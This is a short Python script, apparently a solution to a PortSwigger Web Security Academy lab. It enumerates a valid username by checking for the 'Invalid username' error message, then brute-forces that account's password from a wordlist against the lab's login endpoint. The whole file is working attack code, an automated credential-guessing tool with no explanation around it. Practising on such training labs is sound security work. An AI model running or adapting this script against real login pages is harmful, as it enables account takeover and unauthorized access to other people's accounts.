import requests
usernames = open('usernames.txt','r').read().split('\n')
passwords = open('passwords.txt','r').read().split('\n')

for username in usernames :
    data = {"username":username,"password":"WrongPassword"}
    req = requests.post('https://ac9e1f6d1e975445c07b209900b00040.web-security-academy.net/login',data)
#    print(f"testing username : {username}")
    if "Invalid username" not in req.text:
        user = username
        break


for password in passwords :
    data = {"username":user,"password":password}
    req = requests.post('https://ac9e1f6d1e975445c07b209900b00040.web-security-academy.net/login',data)
#    print(f"testing password : {password}")
    if "Incorrect password" not in req.text :
        print(f"username is {user},password is {password}")
        break
